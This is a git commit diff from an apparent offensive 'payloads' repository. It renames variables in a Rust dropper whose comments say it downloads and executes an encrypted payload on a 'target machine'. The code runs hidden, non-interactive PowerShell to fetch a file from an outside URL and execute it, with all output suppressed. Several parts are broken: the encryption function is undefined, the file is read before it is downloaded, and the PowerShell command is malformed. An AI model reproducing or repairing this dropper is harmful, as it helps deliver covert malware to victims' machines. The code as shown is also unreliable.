74cb6ffd3d699f9ef758b8d49dff9a9a298b3299
cmndcntrlcyber <r.soreng@c3s.consulting>
2024-05-05 23:38:22 -0400

    modified files

--- attcks/payloads/rust/dropship/src/main.rs
+++ attcks/payloads/rust/dropship/src/main.rs
@@ -2,35 +2,35 @@ use std::io::{Read, Write};
 use std::fs::File;
 use std::process::{Command, Stdio};
 
-// Function to generate AES256 encrypted shellcode
-fn generate_encrypted_shellcode() -> Vec<u8> {
+// Function to generate AES256 encrypted dropship
+fn generate_encrypted_dropship() -> Vec<u8> {
 // Generate AES256 key and IV (not shown in this example)
 let key = "ff827540075736f397c113a5edcb5d93".as_bytes();
 let iv = "8cJf6yKp5rEaBtDz".as_bytes();
 
-// Encrypt shellcode using AES256
-let encrypted_shellcode = encrypt_using_aes(b"shellcode", key, iv);
+// Encrypt dropship using AES256
+let encrypted_dropship = encrypt_using_aes(b"dropship", key, iv);
 
-return encrypted_shellcode;
+return encrypted_dropship;
 
 }
 
-// Function to download and execute the encrypted shellcode on target machine
-fn run_encrypted_shellcode() {
-let mut encrypted_shellcode = generate_encrypted_shellcode();
+// Function to download and execute the encrypted dropship on target machine
+fn run_encrypted_dropship() {
+let mut encrypted_dropship = generate_encrypted_dropship();
 
-// Replace the following URL with your own web-hosted AES256 encrypted shellcode file
+// Replace the following URL with your own web-hosted AES256 encrypted dropship file
 let url = "https://attck.pages.dev/attcks/payloads/dropship.bin";
 
-let mut file = File::open("shellcode.bin").expect("Unable to open file");
-file.read_to_end(&mut encrypted_shellcode).expect("Error reading from file");
+let mut file = File::open("dropship.bin").expect("Unable to open file");
+file.read_to_end(&mut encrypted_dropship).expect("Error reading from file");
 
-// Download the encrypted shellcode file
+// Download the encrypted dropship file
 let output = Command::new("powershell")
     .arg("-NoP")
     .arg("-NonI")
     .arg("-W Hidden")
-    .arg(&format!("Invoke-WebRequest -Uri {} -OutFile shellcode.bin", url))
+    .arg(&format!("Invoke-WebRequest -Uri {} -OutFile dropship.bin", url))
     .stdout(Stdio::null())
     .stderr(Stdio::null())
     .output()
@@ -38,15 +38,15 @@ let output = Command::new("powershell")
 
 // Check if the download was successful
 if output.status.success() {
-    // Execute the encrypted shellcode file
+    // Execute the encrypted dropship file
     let output = Command::new("powershell")
         .arg("-NoP")
         .arg("-NonI")
         .arg("-W Hidden")
-        .arg(&format!("$bytes=[System.Text.Encoding]::UTF8.GetBytes([System.Convert]::FromBase64String(Get-Content shellcode.bin | ForEach-Object { if ($_ -eq $null) {} else { [System.Web.HttpUtility]::UrlEncode($_) }})); [byte[]]($bytes); i = 0; while (i -lt $bytes.Length) {{ $i++ }}"))
+        .arg(&format!("$bytes=[System.Text.Encoding]::UTF8.GetBytes([System.Convert]::FromBase64String(Get-Content dropship.bin | ForEach-Object { if ($_ -eq $null) {} else { [System.Web.HttpUtility]::UrlEncode($_) }})); [byte[]]($bytes); i = 0; while (i -lt $bytes.Length) {{ $i++ }}"))
         .arg("-ExecuteByPass")
         .arg("-NoExit")
-        .arg(&format!("shellcode.bin"))
+        .arg(&format!("dropship.bin"))
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .output()
@@ -58,5 +58,5 @@ if output.status.success() {
 }
 
 fn main() {
-run_encrypted_shellcode();
+run_encrypted_dropship();
 }
---
+++ attcks/payloads/rust/dropship/target/x86_64-pc-windows-gnu/release/deps/dropship-fb5f8121b6946260.d
@@ -0,0 +1,5 @@
+/home/cmndcntrl/code/attck/attcks/payloads/rust/dropship/target/x86_64-pc-windows-gnu/release/deps/dropship-fb5f8121b6946260.exe: src/main.rs
+
+/home/cmndcntrl/code/attck/attcks/payloads/rust/dropship/target/x86_64-pc-windows-gnu/release/deps/dropship-fb5f8121b6946260.d: src/main.rs
+
+src/main.rs:
